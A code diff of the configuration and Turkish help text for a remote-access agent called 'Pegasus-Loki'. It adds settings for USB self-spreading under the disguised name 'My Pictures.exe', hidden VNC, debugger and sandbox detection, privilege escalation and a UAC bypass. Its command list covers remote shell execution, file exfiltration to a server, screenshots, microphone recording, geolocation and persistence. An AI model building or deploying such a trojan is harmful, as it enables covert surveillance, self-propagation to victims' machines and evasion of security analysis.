@@ -1,51 +1,98 @@
-SERVER = "http://localhost:8080"
+# Pegasus-Loki Agent Konfigürasyonu
+SERVER = "http://localhost:5000"
 HELLO_INTERVAL = 2
 IDLE_TIME = 60
 MAX_FAILED_CONNECTIONS = 10
 PERSIST = True
+
+# Pegasus özellikleri
+PEGASUS_FEATURES = {
+    'encryption': True,
+    'usb_spread': True,
+    'hvnc': True,
+    'security_checks': True,
+    'anti_analysis': True,
+    'privilege_escalation': True
+}
+
+# Güvenlik ayarları
+SECURITY_SETTINGS = {
+    'mutex_name': 'PegasusLokiMutex',
+    'check_debugger': True,
+    'check_sandbox': True,
+    'sleep_evasion': True,
+    'uac_bypass': False  # Dikkatli kullanın
+}
+
+# USB yayılma ayarları
+USB_SETTINGS = {
+    'enabled': False,  # Varsayılan olarak kapalı
+    'spread_name': 'My Pictures.exe',
+    'folder_name': 'My Pictures',
+    'check_interval': 2.5
+}
+
+# HVNC ayarları
+HVNC_SETTINGS = {
+    'default_host': '127.0.0.1',
+    'default_port': 5900,
+    'auto_start': False
+}
+
 HELP = """
-<any shell command>
-Executes the command in a shell and return its output.
+=== PEGASUS-LOKI AGENT KOMUTLARI ===
 
-upload <local_file>
-Uploads <local_file> to server.
+--- Temel Komutlar ---
+<any shell command>     Komutu shell'de çalıştırır
+help                    Bu yardım mesajını gösterir
+exit                    Agent'ı kapatır
 
-download <url> <destination>
-Downloads a file through HTTP(S).
+--- Dosya İşlemleri ---
+upload <local_file>     Dosyayı sunucuya yükler
+download <url> <dest>   HTTP(S) ile dosya indirir
+zip <archive> <folder>  Klasörü zip arşivi yapar
 
-zip <archive_name> <folder>
-Creates a zip archive of the folder.
+--- Sistem Komutları ---
+screenshot              Ekran görüntüsü alır
+python <command|file>   Python komutu/dosyası çalıştırır
+cd <directory>          Dizin değiştirir
 
-screenshot
-Takes a screenshot.
+--- Kalıcılık ---
+persist                 Agent'ı sisteme kurar
+clean                   Agent'ı sistemden kaldırır
 
-python <command|file>
-Runs a Python command or local file.
+--- Ses Kayıt ---
+record <time> <channel> <chunk> <rate>
+  Örnek: record 10 2 1024 44100
+  -t: Süre (saniye)
+  -c: Kanal sayısı
+  -ch: Chunk boyutu
+  -r: Örnekleme hızı
 
-persist
-Installs the agent.
+--- Pegasus Özellikleri ---
+hvnc start [host] [port]    HVNC başlatır
+hvnc stop                   HVNC durdurur
+hvnc status                 HVNC durumunu gösterir
 
-clean
-Uninstalls the agent.
+usb_status                  USB yayılma durumu
+security_status             Güvenlik durumu
 
-exit
-Kills the agent.
+encrypt <data>              Veriyi şifreler
+decrypt <encrypted_data>    Şifreyi çözer
 
-record
-  -h, --help            show this help message and exit
-  -t RECORD_SECONDS, --time RECORD_SECONDS
-                        Set a timing in seconds for record. (e.g 10)
-  -c CHANNELS, --channel CHANNELS
-                        Channel for the microphone (e.g 2).
-  -ch CHUNK, --chunk CHUNK
-                        Chunk for the microphone (e.g 1024).
-  -r RATE, --rate RATE  Rate (e.g 44100).
+geolocalisation            Konum bilgisi alır
+lockscreen                 Ekranı kilitler (Windows)
 
-  Exemple : record 12 2 1024 44100
-                  -t -c -ch   -r
+--- Gelişmiş Özellikler ---
+Pegasus-Loki agent aşağıdaki gelişmiş özellikleri destekler:
+• AES-256 şifreleme
+• USB otomatik yayılma
+• Hidden VNC (HVNC)
+• Anti-analiz koruması
+• Mutex kontrolü
+• Yetki yükseltme
+• Sandbox tespit
+• Debugger tespit
 
-
-lockscreen
-lock screen only on windows
-
+Daha fazla bilgi için: https://github.com/pegasus-loki
 """
